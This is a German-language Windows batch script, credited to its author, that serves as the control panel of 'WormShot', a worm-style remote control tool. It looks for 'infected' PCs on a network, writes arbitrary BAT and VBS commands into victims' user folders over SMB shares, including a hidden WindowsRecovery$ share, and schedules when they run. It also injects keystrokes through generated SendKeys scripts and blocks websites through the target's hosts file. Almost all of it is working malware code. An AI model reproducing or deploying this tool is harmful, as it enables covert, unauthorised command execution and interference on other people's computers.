@echo off
REM ***************** Scripted by Kevin Riedl **********************

title WormShot
Setlocal ENABLEDELAYEDEXPANSION
:wormshot
mode con cols=75 lines=45
color 1c
set remotepc=%computername%
set remoteuser=%username%
:wormshotblockredefine
cls
echo. 
echo ************* WormShot - Kontrollpanel *************** 
echo. 
echo Willkommen bei WormShot..
echo Beachte: Nur infizierte Computer koennen gehackt werden!
echo.
echo Um unerreichbar zu sein, erstelle die Datei 'Isolate.wsdt' 
echo auf deinem Desktop. 
echo. 
if /i "%remotepc%"=="show" set remotepc=%computername%&net view&echo.
echo Welchen Remote-PC moechtest du hacken? [Ohne \\] ['Show' fuer PCs]
set /p remotepc=---[ 
if /i "%remotepc%"=="show" goto wormshotblockredefine
if exist "\\%remotepc%\users\" if not exist "\\%remotepc%\WindowsRecovery$\" echo [-- MELDUNG: WormShot limitiert, am ZIEL-PC neu installieren.
if not exist "\\%remotepc%\users\" if exist "\\%remotepc%\WindowsRecovery$\" set remotepc=%remotepc%\WindowsRecovery$
if exist "\\%remotepc%\users\" if exist "\\%remotepc%\WindowsRecovery$\" set remotepc=%remotepc%\WindowsRecovery$
if not exist "\\%remotepc%\users\" echo [-- MELDUNG: Angefordeter PC nicht aktiv. --]&timeout 10 >Nul&goto wormshotblockredefine
echo. 
:wormshotblockredefine_user
echo Welchen User moechtest du hacken? 
set /p remoteuser=---[ 
if not exist "\\%remotepc%\Users\%remoteuser%\" echo [-- MELDUNG: Angefordeter User existiert nicht --]&timeout 10 >Nul&goto wormshotblockredefine_user
:wormshot_do
set slotschedulevar=no
cls
echo. 
echo ************* WormShot - Kontrollpanel *************** 
echo. 
if exist "\\%remotepc%\Users\%remoteuser%\WormShot\Z_TestPING.WSDT" if exist "\\%remotepc%\Users\%remoteuser%\WormShot\X_TestPING.WSDT" echo ERROR ####: De- und Aktivierte Ping-Datei gefunden.&timeout 10 >nul&del "\\%remotepc%\Users\%remoteuser%\WormShot\Z_TestPING.WSDT"
if exist "\\%remotepc%\Users\%remoteuser%\WormShot\Z_TestPING.WSDT" ren "\\%remotepc%\Users\%remoteuser%\WormShot\Z_TestPING.WSDT" "X_TestPING.WSDT"
if not exist "\\%remotepc%\Users\%remoteuser%\WormShot\X_TestPING.WSDT" echo ERROR ####: PING-Datei nicht vorhanden.&timeout 5 >Nul&echo Pruef-Datei > "\\%remotepc%\Users\%remoteuser%\WormShot\X_TestPING.WSDT"
if exist "\\%remotepc%\Users\%remoteuser%\WormShot\X_TestPING.WSDT" ren "\\%remotepc%\Users\%remoteuser%\WormShot\X_TestPING.WSDT" "Z_TestPING.WSDT"&timeout 1 /NOBREAK >Nul
if exist "\\%remotepc%\Users\%remoteuser%\WormShot\X_TestPING.WSDT" set wormshotstatus=ACTIVATED
if exist "\\%remotepc%\Users\%remoteuser%\WormShot\Z_TestPING.WSDT" set wormshotstatus=DEACTIVATED
echo [-- PC-STATUS: %wormshotstatus% / ZIEL-PC: %remotepc% --]
echo.
echo Verfuegbare Befehle:
if not exist "\\%remotepc%\Users\%remoteuser%\" echo.&echo [-- MELDUNG: Angefordeter PC nicht online. --]&pause >Nul&goto start
if not exist "\\%remotepc%\Users\%remoteuser%\WormShot\SYS\search.bat" echo.&echo [-- MELDUNG: Angefordeter PC ist nicht infiziert. --]&pause >Nul&goto start
dir "\\%remotepc%\Users\%remoteuser%\WormShot\*.bat";"\\%remotepc%\Users\%remoteuser%\WormShot\*.vbs" /B 
echo.
REM Nächste Zeile ist ein wichtiger Bestandteil von WormShot.
if exist "\\%remotepc%\Users\%remoteuser%\Desktop\Isolate.wsdt" echo MELDUNG: User offline.&timeout 10 >nul&exit
echo * (X) Befehl angeben [Bsp.: Slot-1.bat] * Planen (1) * (0) Exit *
echo * (2) Erstellen *
set /p wormshotaction=---[ 
if /i "%wormshotaction%"=="sys" echo MELDUNG: 'SYS' ist ein Verzeichnis und ist das Herz von WormShot&timeout 12 >Nul&goto wormshot_do
if /i "%wormshotaction%"=="verlauf.txt" echo MELDUNG: 'Verlauf.txt' ist ein Systemdokument.&timeout 12 >Nul&goto wormshot_do
if /i "%wormshotaction%"=="error.txt" echo MELDUNG: 'Error.txt' ist ein Fehlersammeldokument.&timeout 12 >Nul&goto wormshot_do
if /i "%wormshotaction%"=="exit" goto start
if /i "%wormshotaction%"=="0" goto start
if /i "%wormshotaction%"=="planen" goto wormshot_schedule
if /i "%wormshotaction%"=="plan" goto wormshot_schedule
if /i "%wormshotaction:~0,1%"=="1" goto wormshot_schedule
if /i "%wormshotaction%"=="schedule" goto wormshot_schedule
if /i "%wormshotaction%"=="speichern" goto wormshot_create
if /i "%wormshotaction%"=="erstellen" goto wormshot_create
if /i "%wormshotaction:~0,1%"=="2" goto wormshot_create
if /i "%wormshotaction%"=="create" goto wormshot_create
if exist "\\%remotepc%\Users\%remoteuser%\Wormshot\0__%wormshotaction%" if /i "%wormshotaction%"=="Slot-1.bat" set wormshotaction=Slot-1.BAT&goto slotdefine
if exist "\\%remotepc%\Users\%remoteuser%\Wormshot\0__%wormshotaction%" if /i "%wormshotaction%"=="Slot-2.bat" set wormshotaction=Slot-2.BAT&goto slotdefine
if exist "\\%remotepc%\Users\%remoteuser%\Wormshot\0__%wormshotaction%" if /i "%wormshotaction%"=="Slot-3.vbs" set wormshotaction=Slot-3.VBS&goto slotdefine
if not exist "\\%remotepc%\Users\%remoteuser%\Wormshot\0_%wormshotaction%" if exist "\\%remotepc%\Users\%remoteuser%\Wormshot\1_%wormshotaction%" echo ERROR W_003: Befehl bereits in Arbeit oder WormShot ist gerade deaktiviert.&echo.&echo [ Befehl reaktivieren? [J/N] ]&set /p reactivate=--- &if /i "%reactivate%"=="n" goto wormshot_do
if not exist "\\%remotepc%\Users\%remoteuser%\Wormshot\0_%wormshotaction%" if exist "\\%remotepc%\Users\%remoteuser%\Wormshot\1_%wormshotaction%" ren "\\%remotepc%\Users\%remoteuser%\Wormshot\1_%wormshotaction%" "0_%wormshotaction%" || echo ERROR W_006: Deaktivierung fehlgeschlagen. && goto wormshot_do
if exist "\\%remotepc%\Users\%remoteuser%\Wormshot\0_%wormshotaction%" if /i "%wormshotaction%"=="HostsBlock_ON.bat" set wormshotaction=HostsBlock_ON.bat&goto wormshot_hostsblock 
if exist "\\%remotepc%\Users\%remoteuser%\Wormshot\0_%wormshotaction%" if /i "%wormshotaction%"=="KeySend.vbs" set wormshotaction=KeySend.vbs&goto keysenddefine  
if not exist "\\%remotepc%\Users\%remoteuser%\Wormshot\0_%wormshotaction%" if not exist "\\%remotepc%\Users\%remoteuser%\Wormshot\1_%wormshotaction%" echo ERROR W_001: Befehl existiert nicht oder ist falsch konfiguriert.&timeout 10 >NUL&goto wormshot_do
:wormshot_hostsblock_start
if exist "\\%remotepc%\Users\%remoteuser%\Wormshot\0_%wormshotaction%" if exist "\\%remotepc%\Users\%remoteuser%\Wormshot\1_%wormshotaction%" echo ERROR W_004: Befehl exisitiert doppelt.&timeout 8 /NOBREAK >NUL&goto wormshot_do
if exist "\\%remotepc%\Users\%remoteuser%\Wormshot\0_%wormshotaction%" ren "\\%remotepc%\Users\%remoteuser%\Wormshot\0_%wormshotaction%" "1_%wormshotaction%"&echo MELDUNG: WormShot-Hack durchgefuehrt. [PRUEFUNG AKTIV]&goto wormshot_do_pruef
echo ERROR W_002: Befehl nicht verfuegbar.&timeout 10 >Nul&goto wormshot_do

:keysenddefine
cls
echo. 
echo ************* WormShot - Kontrollpanel *************** 
echo. 
echo KeySend bietet Attribute: * standard * live *
set /p attributkeysend=[--- 
echo %attributkeysend% | findstr /i "live" && set attributkeysend=LIVE
set attributkeysend=STANDARD
rem grundgerüst aufbauen
if not exist "\\%remotepc%\Users\%remoteuser%\Wormshot\SYS\CollectedData\BackUp\Keysend_Struktur_%attributkeysend%.wsdt" echo ERROR ####-3: KeySend-Struktur nicht vorhanden.>>"\\%remotepc%\Users\%remoteuser%\Wormshot\Error.txt"&goto wormshot_do
if exist "\\%remotepc%\Users\%remoteuser%\Wormshot\1_KeySend.vbs" del "\\%remotepc%\Users\%remoteuser%\Wormshot\1_KeySend.vbs"
type \\%remotepc%\Users\%remoteuser%\Wormshot\SYS\CollectedData\BackUp\Keysend_Struktur_%attributkeysend%.wsdt > \\%remotepc%\Users\%remoteuser%\Wormshot\0_KeySend.vbs
:blankkeysend
cls
echo. 
echo ************* WormShot - Kontrollpanel *************** 
echo. 

rem texteingabe
echo [ KeySend Ghost - %attributkeysend% Mode ] - TextEingabe
set next=1
echo.
echo '#start#' fuer ENDE / {ENTER} = ENTER
echo WICHTIG: '#start#' immer ALLEINE senden.
echo.
echo Gib deinen Text ein: [#start# wird in {ENTER} konv.]
echo.
set startdefine=!next!
for /L %%a in (!next! 1 1000000) do (
set /p keysend%%a=[~~~ 
echo !keysend%%a! | findstr /i "#start#">nul&&set keysend%%a={ENTER}&&set /a next=%%a+1&&set last=%%a&&call :transfer
)
:transfer
for /L %%b in (!startdefine! 1 !last!) do (
echo WshShell.SendKeys "!keysend%%b!" >> \\%remotepc%\Users\%remoteuser%\Wormshot\0_KeySend.vbs
echo WScript.Sleep 500 >> \\%remotepc%\Users\%remoteuser%\Wormshot\0_KeySend.vbs
)

:endkeysend
if not exist "\\%remotepc%\Users\%remoteuser%\Wormshot\0_KeySend.vbs" echo ERROR ####-1: KeySend-Datei nicht erstellt.
if exist "\\%remotepc%\Users\%remoteuser%\Wormshot\0_KeySend.vbs" ren "\\%remotepc%\Users\%remoteuser%\Wormshot\0_KeySend.vbs" "1_KeySend.vbs"
if not exist "\\%remotepc%\Users\%remoteuser%\Wormshot\1_KeySend.vbs" echo ERROR ####-2: KeySend-Datei nicht unbenannt.
if exist "\\%remotepc%\Users\%remoteuser%\Wormshot\1_KeySend.vbs" echo MELDUNG: KeySend erfolgreich uebertragen.
timeout 12 >Nul
goto wormshot_do

:wormshot_do_pruef
timeout 2 /NOBREAK >NUL
if /i "%wormshotstatus%"=="DEACTIVATED" if exist "\\%remotepc%\Users\%remoteuser%\Wormshot\1_%wormshotaction%" echo MELDUNG: WormShot-Hack ERFOLGREICH. - WormShot INAKTIV&&timeout 15 >Nul&&goto wormshot_do
if /i "%wormshotstatus%"=="DEACTIVATED" if not exist "\\%remotepc%\Users\%remoteuser%\Wormshot\1_%wormshotaction%" if exist "\\%remotepc%\Users\%remoteuser%\Wormshot\1_%wormshotaction%" echo ERROR ####: WormShot-Hack FEHLGESCHLAGEN - WormShot INAKTIV&&timeout 2 /NOBREAK >NUL&&timeout 15 >Nul&&goto wormshot_do
if /i "%wormshotstatus%"=="ACTIVATED" type "\\%remotepc%\Users\%remoteuser%\Wormshot\Verlauf.txt">nul | findstr /i "%wormshotaction%" && type "\\%remotepc%\Users\%remoteuser%\Wormshot\Verlauf.txt">nul | findstr /i "%date% (%time:~0,5%):" && echo MELDUNG: WormShot-Hack ERFOLGREICH - WormShot AKTIV&&timeout 2 /NOBREAK >NUL&&timeout 15 >Nul&&goto wormshot_do
if /i "%wormshotstatus%"=="ACTIVATED" type "\\%remotepc%\Users\%remoteuser%\Wormshot\Verlauf.txt">Nul | findstr /i "%date% (%time:~0,5%):" || type "\\%remotepc%\Users\%remoteuser%\Wormshot\Verlauf.txt">nul | findstr /i "%wormshotaction%" || echo MELDUNG: WormShot-Hack FEHLGESCHLAGEN - WormShot AKTIV&&timeout 2 /NOBREAK >NUL&&timeout 15 >Nul&&goto wormshot_do
if /i "%wormshotstatus%"=="ACTIVATED" type "\\%remotepc%\Users\%remoteuser%\Wormshot\Verlauf.txt">Nul | findstr /i "%date% (%time:~0,5%):" || echo MELDUNG: WormShot-Hack FEHLGESCHLAGEN_2 - WormShot AKTIV&&timeout 2 /NOBREAK >NUL&&timeout 15 >Nul&&goto wormshot_do
echo ERROR W_005: Fehlerhaftes Erfolgszeugnis.&timeout 2 /NOBREAK >NUL&timeout 10 >Nul&goto wormshot_do

:wormshot_hostsblock
for /L %%a in (1 1 5) do (
set blockhp%%a=RESET
)
cls
echo. 
echo ************* WormShot - Kontrollpanel *************** 
echo. 
echo [- HostsBlock AKTIVIERT -] -- [ '#start#' zum Starten ]
echo Zu blockierende URL angeben (ohne www.,http://,...)
echo.
echo HINWEIS: SSL-Protokolle werden NICHT blockiert
for /L %%a in (1 1 5) do (
set /P blockhp%%a=###-- 
if /i "!blockhp%%a!"=="#start#" set blockhp%%a=RESET&goto wormshot_hostsblock_send
if /i "!blockhp%%a!"=="#start" set blockhp%%a=RESET&goto wormshot_hostsblock_send
if /i "!blockhp%%a!"=="start#" set blockhp%%a=RESET&goto wormshot_hostsblock_send
if exist "\\%remotepc%\Windows\System32\drivers\etc\hosts" findstr /m /L /i /C:"!blockhp%%a!" "\\%remotepc%\Windows\System32\drivers\etc\hosts" >Nul && echo ERROR ####: '!blockhp%%a!' bereits blockiert.&&timeout 10 >Nul&&goto wormshot_hostsblock
)
:wormshot_hostsblock_send
echo echo Webseiten werden blockiert > "\\%remotepc%\Users\%remoteuser%\Wormshot\AdditionalData\HostsBlock_ON_DefineHP.bat"
for /L %%a in (1 1 5) do (
echo set blockhp%%a=!blockhp%%a!>> "\\%remotepc%\Users\%remoteuser%\Wormshot\AdditionalData\HostsBlock_ON_DefineHP.bat"
)
goto wormshot_hostsblock_start
echo ERROR ####: Hier solltest du nicht hin.&timeout 10 >Nul&goto wormshot_do

:slotdefine
if /i "%slotschedulevar%"=="yes" set wormshotaction=%wormshotschedule%
cls
echo. 
echo ************* WormShot - Kontrollpanel *************** 
echo. 
echo %wormshotaction:~0,6% / Benutzerdefinierte '%wormshotaction:~7,3%'
echo ACHTUNG: Syntax wird nicht kontrolliert. 
echo.
REM BEACHTE: '^&^ = ^^^&^^' // ^>^>^ = ^^>^>^^
echo Um Datei zu speichern/starten: '#START#'
echo '#START#' wird im Slot in 'exit/WScript.quit' konvertiert. 
if /i "%wormshotaction:~7,3%"=="BAT" set byebye=call exit
if /i "%wormshotaction:~7,3%"=="VBS" set byebye=wscript.quit
for /L %%a in (1 1 99999) do (
set /p Zeile-%%a=Zeile %%a [-- 
if /i "!zeile-%%a!"=="#START#" set zeile-%%a=%byebye%&goto slotdefinedone
)
:slotdefinedone
if not exist "\\%remotepc%\Users\%remoteuser%\Wormshot\0__%wormshotaction%" if not exist "\\%remotepc%\Users\%remoteuser%\Wormshot\1__%wormshotaction%" echo ERROR ####: Slot wurde unerwartet geloescht.&echo - Oder Netzwerkverbindung abgebrochen.&timeout 15 >Nul&goto exit
if not exist "\\%remotepc%\Users\%remoteuser%\Wormshot\0__%wormshotaction%" if exist "\\%remotepc%\Users\%remoteuser%\Wormshot\1__%wormshotaction%" echo Fatal-ERROR ####: WormShot wird am Ziel-PC nicht ausgefuehrt.&timeout 15 >Nul&goto exit
if /i "%wormshotaction:~7,3%"=="BAT" echo ^REM^ %wormshotaction% - %date% / %time% > "\\%remotepc%\Users\%remoteuser%\Wormshot\0__%wormshotaction%"
if /i "%wormshotaction:~7,3%"=="VBS" echo '%wormshotaction% - %date% / %time% > "\\%remotepc%\Users\%remoteuser%\Wormshot\0__%wormshotaction%"
for /L %%a in (1 1 99999) do (
echo !Zeile-%%a! >> "\\%remotepc%\Users\%remoteuser%\Wormshot\0__%wormshotaction%"
if /i "!zeile-%%a!"=="call exit" goto slotdefinewritten
if /i "!zeile-%%a!"=="wscript.quit" goto slotdefinewritten
)
:slotdefinewritten
xcopy /I /Q /H /-Y "\\%remotepc%\Users\%remoteuser%\Wormshot\0__%wormshotaction%" "\\%remotepc%\Users\%remoteuser%\Wormshot\SYS\CollectedData\SLOT-Cache\" >nul
set tempfilename=%wormshotaction:~0,6%_%date%_%time:~0,2%-%time:~3,2%-%time:~6,2%.%wormshotaction:~7,3%
ren "\\%remotepc%\Users\%remoteuser%\Wormshot\SYS\CollectedData\SLOT-Cache\0__%wormshotaction%" "%tempfilename%"
if exist "\\%remotepc%\Users\%remoteuser%\Wormshot\SYS\CollectedData\SLOT-Cache\%tempfilename%" echo.&echo MELDUNG: Slot ins Archiv gespeichert.
if not exist "\\%remotepc%\Users\%remoteuser%\Wormshot\SYS\CollectedData\SLOT-Cache\%tempfilename%" echo.&echo ERROR ####: Slot NICHT ins Archiv gespeichert.
if /i "%slotschedulevar%"=="yes" goto slotschedule
ren "\\%remotepc%\Users\%remoteuser%\Wormshot\0__%wormshotaction%" "1__%wormshotaction%"
echo MELDUNG: Slot wurde ausgefuehrt.
pause >Nul
goto wormshot

:wormshot_create
color cf
cls
echo. 
echo ************* WormShot - Kontrollpanel *************** 
echo.
echo EMPFOHLEN: Fuer eine eindeutige Versions-Identitaet sollten 
echo neue Befehle nur auf dem lokalen PC gespeichert werden. 
echo.
echo Befehle koennen nicht geloescht werden. Das Entfernen eines
echo Befehls ist nur manuell ueber die Systemdateien moeglich. 
echo.
echo Lokaler PC: %computername% / Gewaehlter PC: %remotepc%
set changetolokal=n
echo %remotepc% | findstr "WindowsRecovery$" && if /i "%computername%\WindowsRecovery$" NEQ "%remotepc%" set /p changetolokal=Moechtest du auf das lokale System wechseln? [J/N] [-- 
if /i "%computername%" NEQ "%remotepc%" set /p changetolokal=Moechtest du auf das lokale System wechseln? [J/N] [-- 
if /i "%changetolokal%"=="j" set remotepc=%computername%&goto wormshot_create
echo.
echo Neuer Befehl: (Ohne 0_/1_) (Ohne .bat, .vbs)
echo Befehl exisitiert bereits (Ohne 0_/1_) (Ohne .bat, .vbs)
set wormcreatefilename=15975324860
set /p wormcreatefilename=[-- 
if /i "%wormcreatefilename%"=="15975324860" echo ERROR ####: Gib einen Befehlnamen ein.&timeout 8 >nul&goto wormshot_create
echo. 
set starter=RESET
set wormcreatefilextension=15975324860
set /p wormcreatefilextension=BAT/VBS [-- 
if /i "%wormcreatefilextension%"=="15975324860" echo ERROR ####: Gib ein Format ein.&timeout 8 >nul&goto wormshot_create
if /i "%wormcreatefilextension%"=="BAT" set wormcreatefilextension=BAT&set byebyecr=call exit&set starter=call
if /i "%wormcreatefilextension%"=="VBS" set wormcreatefilextension=VBS&set byebyecr=wscript.quit&set starter=cscript
if /i "%starter%"=="RESET" echo ERROR ####: '.%wormcreatefilextension%' wird nicht unterstuetzt.&timeout 10 >NUl&goto wormshot_create
set alreadyexistsave=n
if exist "\\%remotepc%\Users\%remoteuser%\Wormshot\0_%wormcreatefilename%.%wormcreatefilextension%" goto wormshot_createdalready
if exist "\\%remotepc%\Users\%remoteuser%\Wormshot\1_%wormcreatefilename%.%wormcreatefilextension%" goto wormshot_createdalready
cls
echo. 
echo ************* WormShot - Kontrollpanel *************** 
echo. 
echo %wormcreatefilename% / Neue '%wormcreatefilextension%'
echo ACHTUNG: Syntax wird nicht kontrolliert. 
echo.
REM BEACHTE: '^&^ = ^^^&^^' // ^>^>^ = ^^>^>^^
echo Um Datei zu speichern/starten: '#START#'
echo '#START#' wird in 'exit/WScript.quit' konvertiert. 
for /L %%a in (1 1 99999) do (
set /p Zeile-%%a=Zeile %%a [-- 
if /i "!zeile-%%a!"=="#START#" set zeile-%%a=%byebyecr%&goto createdefinedone
)
:createdefinedone
if exist "\\%remotepc%\Users\%remoteuser%\Wormshot\0_%wormcreatefilename%.%wormcreatefilextension%" goto wormshot_createdalready
if exist "\\%remotepc%\Users\%remoteuser%\Wormshot\1_%wormcreatefilename%.%wormcreatefilextension%" goto wormshot_createdalready
for /L %%a in (1 1 99999) do (
echo !Zeile-%%a! >> "\\%remotepc%\Users\%remoteuser%\Wormshot\0_%wormcreatefilename%.%wormcreatefilextension%"
if /i "!zeile-%%a!"=="call exit" goto createdefinewritten
if /i "!zeile-%%a!"=="wscript.quit" goto createdefinewritten
)
:createdefinewritten
if exist "\\%remotepc%\Users\%remoteuser%\Wormshot\0_%wormcreatefilename%.%wormcreatefilextension%" echo MELDUNG: Befehl erfolgreich gespeichert.
if not exist "\\%remotepc%\Users\%remoteuser%\Wormshot\0_%wormcreatefilename%.%wormcreatefilextension%" echo ERROR ####: Befehl nicht gespeichert.&timeout 10 >Nul&goto wormshot

if not exist "\\%remotepc%\Users\%remoteuser%\Wormshot\SYS\search_undefine.bat" echo ERROR ####: Search_Undefine.bat nicht gefunden.&timeout 10 >NUl&goto wormshot
if not exist "\\%remotepc%\Users\%remoteuser%\Wormshot\SYS\search_doit.bat" echo ERROR ####: Search_DoIt.bat nicht gefunden.&timeout 10 >NUl&goto wormshot
if not exist "\\%remotepc%\Users\%remoteuser%\Wormshot\SYS\rundo_doit.bat" echo ERROR ####: RunDo_DoIt.bat nicht gefunden.&timeout 10 >NUl&goto wormshot
echo set %wormcreatefilename%=off>> "\\%remotepc%\Users\%remoteuser%\Wormshot\SYS\search_undefine.bat"
echo if exist "1_%wormcreatefilename%.%wormcreatefilextension%" ren "1_%wormcreatefilename%.%wormcreatefilextension%" "0_%wormcreatefilename%.%wormcreatefilextension%"^&^&^echo set %wormcreatefilename%=on^>^>^ "DO.bat" >> "\\%remotepc%\Users\%remoteuser%\Wormshot\SYS\search_doit.bat"
echo if /i "%%%wormcreatefilename%:~0,2%%"=="on" set %wormcreatefilename%=off^&^%starter% "0_%wormcreatefilename%.%wormcreatefilextension%"^&^echo %%date%% (%%time:~0,5%%): * %wormcreatefilename% * ausgefuehrt ^>^>^ "Verlauf.txt" >> "\\%remotepc%\Users\%remoteuser%\Wormshot\SYS\rundo_doit.bat"
echo MELDUNG: Befehl startbereit.&timeout 2 /NOBREAK >NUL&timeout 8 >Nul&goto wormshot
echo ERROR ####: Hier solltest du nicht hin. &timeout 10 >nul&exit

:wormshot_createdalready
echo.
echo MELDUNG: Datei existiert bereits. 
echo ACHTUNG: Es wird nicht ueberprueft, ob der Befehl schon starbereit ist.
set /P alreadyexistsave=Soll die vorhandene Datei startbereit gemacht werden? [J/N] [-- 
echo.
if /i "%alreadyexistsave:~0,1%"=="y" goto createdefinewritten
if /i "%alreadyexistsave:~0,1%"=="j" goto createdefinewritten
goto wormshot_create

:wormshot_schedule
set slotschedulevar=no
color 2b
cls
echo. 
echo ************* WormShot - Kontrollpanel *************** 
echo.
echo [- SCHEDULE MODE: ON - ZEITPLANERDIENST: EIN -]
echo BEACHTE: Es wird nur der zeitpunktfrueheste Befehl ausgefuehrt. 
echo Die anderen Befehle werden ignoriert und geloescht. 
echo.
echo TIPP: Mehrere Befehle kannst du nur zeitgleich ausfuehren. 
echo.
set /a schedulenewday=%date:~0,2%+1
set schedulenewdate=%schedulenewday%.%date:~3,7%
set scheduledatetime=%schedulenewdate%/%time:~0,5%
echo Wann soll der HACK gestartet werden? [STANDARD: '%scheduledatetime%']
set /p scheduledatetime=[###] { 
echo.
:wormshot_schedule_do
set slotstripe=
cls
echo. 
echo ************* WormShot - Kontrollpanel *************** 
echo.
dir "\\%remotepc%\Users\%remoteuser%\WormShot\*.bat";"\\%remotepc%\Users\%remoteuser%\WormShot\*.vbs" /B 
echo.
echo BEACHTE: HostsBlock_ON/OFF.bat wird mit den im Cache verspeicherten
echo Homepages ausgefuehrt. 
echo.
echo ZEITPLANERDIENST aktivieren [SYNTAX: WormShot_Off.bat]
set /p wormshotschedule=[###] { 
if /i "%wormshotschedule%"=="sys" echo MELDUNG: 'SYS' ist ein Verzeichnis und ist das Herz von WormShot&timeout 12 >Nul&goto wormshot_schedule_do
if /i "%wormshotschedule%"=="verlauf.txt" echo MELDUNG: 'Verlauf.txt' ist ein Systemdokument.&timeout 12 >Nul&goto wormshot_schedule_do
if /i "%wormshotschedule%"=="error.txt" echo MELDUNG: 'Error.txt' ist ein Fehlersammeldokument.&timeout 12 >Nul&goto wormshot_schedule_do
if /i "%wormshotschedule%"=="exit" goto start
if exist "\\%remotepc%\Users\%remoteuser%\Wormshot\0__%wormshotschedule%" if /i "%wormshotschedule%"=="Slot-1.bat" set slotstripe=_&set slotschedulevar=yes&set wormshotschedule=Slot-1.BAT&goto slotdefine
if exist "\\%remotepc%\Users\%remoteuser%\Wormshot\0__%wormshotschedule%" if /i "%wormshotschedule%"=="Slot-2.bat" set slotstripe=_&set slotschedulevar=yes&set wormshotschedule=Slot-2.BAT&goto slotdefine
if exist "\\%remotepc%\Users\%remoteuser%\Wormshot\0__%wormshotschedule%" if /i "%wormshotschedule%"=="Slot-3.vbs" set slotstripe=_&set slotschedulevar=yes&set wormshotschedule=Slot-3.VBS&goto slotdefine
if not exist "\\%remotepc%\Users\%remoteuser%\Wormshot\0_%wormshotschedule%" if not exist "\\%remotepc%\Users\%remoteuser%\Wormshot\1_%wormshotschedule%" echo ERROR W_001: Befehl existiert nicht oder ist falsch konfiguriert.&timeout 10 >NUL&goto wormshot_schedule_do
if not exist "\\%remotepc%\Users\%remoteuser%\Wormshot\0_%wormshotschedule%" if exist "\\%remotepc%\Users\%remoteuser%\Wormshot\1_%wormshotschedule%" echo ERROR W_003: Befehl bereits in Arbeit oder WormShot ist gerade deaktiviert.&timeout 8 /NOBREAK >NUL&goto wormshot_schedule_do
if exist "\\%remotepc%\Users\%remoteuser%\Wormshot\0_%wormshotschedule%" if exist "\\%remotepc%\Users\%remoteuser%\Wormshot\1_%wormshotschedule%" echo ERROR W_004: Befehl exisitiert doppelt.&timeout 8 /NOBREAK >NUL&goto wormshot_schedule_do
:slotschedule
echo %wormshotschedule% | findstr /i ".bat" && set wormextension=call >nul
echo %wormshotschedule% | findstr /i ".vbs" && set wormextension=cscript >nul
if exist "\\%remotepc%\Users\%remoteuser%\Wormshot\0_%slotstripe%%wormshotschedule%" echo. >> "\\%remotepc%\Users\%remoteuser%\Wormshot\SYS\rundo_schedule.bat"&echo if /i "%%date%%"=="%scheduledatetime:~0,10%" if "%%time:~0,5%%"=="%scheduledatetime:~11,5%" ( %wormextension% "0_%slotstripe%%wormshotschedule%" >> "\\%remotepc%\Users\%remoteuser%\Wormshot\SYS\rundo_schedule.bat"&echo set scheduleplan=yes >> "\\%remotepc%\Users\%remoteuser%\Wormshot\SYS\rundo_schedule.bat"&echo echo %%date%% [%%time:~0,5%%] * %wormshotschedule% * ausgefuehrt ^>^> "Verlauf.txt" ) >> "\\%remotepc%\Users\%remoteuser%\Wormshot\SYS\rundo_schedule.bat"&&echo MELDUNG: Befehl erfolgreich dem ZEITPLANERDIENST hinzugefuegt.&timeout 10 >NUL&goto wormshot_schedule_do
echo ERROR W_004: Befehl nicht verfuegbar.&timeout 10 >Nul&goto wormshot_schedule_do